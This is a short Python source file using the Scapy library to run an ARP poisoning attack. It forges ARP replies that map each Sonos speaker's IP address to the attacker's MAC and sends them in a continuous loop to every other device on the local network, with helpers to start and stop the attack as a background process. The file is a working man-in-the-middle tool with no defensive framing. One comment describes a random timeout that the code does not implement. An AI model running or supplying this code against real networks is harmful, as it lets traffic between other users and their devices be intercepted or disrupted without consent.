import multiprocessing as mp
from scapy.all import *


def ARPPoison(interface, SonosIPs, clients, local_ip, local_mac):
	pkts = []				# List of packets to be sent.

	if not clients:
		## Find all clients on the network
		print("ERR: NO CLIENTS")
		return

	if not SonosIPs:
		## Find all the Sonos devices in the network
		print("ERR: NO SONOSIPS")
		return

	## Find all other devices in the network, so the targets
	targets = [client for client in clients if client["ip"] not in SonosIPs + [local_ip]]

	if not targets:
		print("ERR: NO TARGETS")
		return

	## Creation of all the packets to be sent.
	for sonos in SonosIPs:
		for victim in targets:
			arp = Ether() / ARP()
			arp[Ether].src = local_mac
			arp[ARP].hwsrc = local_mac
			arp[ARP].psrc = sonos
			arp[ARP].hwdst = victim['mac']
			arp[ARP].pdst =  victim['ip']  

			pkts.append(arp)

	interval = 5/len(pkts)
	## Using the Scapy function sendp to send all the packets to specified interface and with specified amount of loops.
	## The interation timeout is set to a random integer between 15 and 45 as is specification for windows systems.
	sendp(pkts, iface=interface, loop=1, inter=interval, verbose=0)


def startPoison(interface, sonos, clients, local_ip, local_mac):
	process = mp.Process(target=ARPPoison, args=[interface, sonos, clients, local_ip, local_mac])
	process.start()
	return process


def stopPoison(process):
	process.terminate()